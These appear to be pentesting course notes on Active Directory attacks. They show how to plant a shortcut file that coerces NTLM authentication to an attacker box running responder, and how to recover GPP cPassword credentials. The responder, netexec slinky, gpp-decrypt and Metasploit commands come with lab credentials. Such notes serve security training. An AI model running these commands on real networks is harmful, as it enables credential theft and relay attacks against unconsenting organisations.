**Similar to LLMNR poisoning with responder**,  
but in this case we create a shortcut Link file– is an internet shortcut file – that points to our kali box ip !!  

Place the file in frequently accessed folders, file share, or \\kali.ip in csv injection   
Rename the file to start with @ to make the file appear on top !!  

Run responder running to capture NetNTLMv2 hash, crack or relay it !!   
sudo responder –I eth0 –dPv  

Creating LNK file: windows powershell or crackmapexec ..  
Netexec smb 10.1.1.TARGETIP -d marvel.local -u fcastle –p Password1 –M slinky –o NAME=test SERVER=10.1.1.KALI-IP    
//creates a test lnk file and place it on the SMB share of target IP pointing to kali  
<img width="311" height="75" alt="image" src="https://github.com/user-attachments/assets/4e6ae9b3-fddb-4626-bac1-52691488a1f8" />

Forced authentication methods: https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf  

**GPP/CPassword attacks**: GPP allowed admins to create policies using embedded credentials,  
these creds were encrypted and placed in cPassword, the key was accidentally released and patched in MS14-025  
but doesn’t prevent previous issues those files that are not removed !!  
domain controllers probably patched in 2015..  older - so delete any older gpp files    

with creds just valid creds need not be domain admin, SYS volume of DC..  
How to id: look for policies xml files for word cPassword=   
with rapid7 tool     
Gpp-decrypt cPasswordHASH  
with msfconsole  
use smb_enu_gpp  //finds policie, groups.xml and find cPass and auto decrypts it  
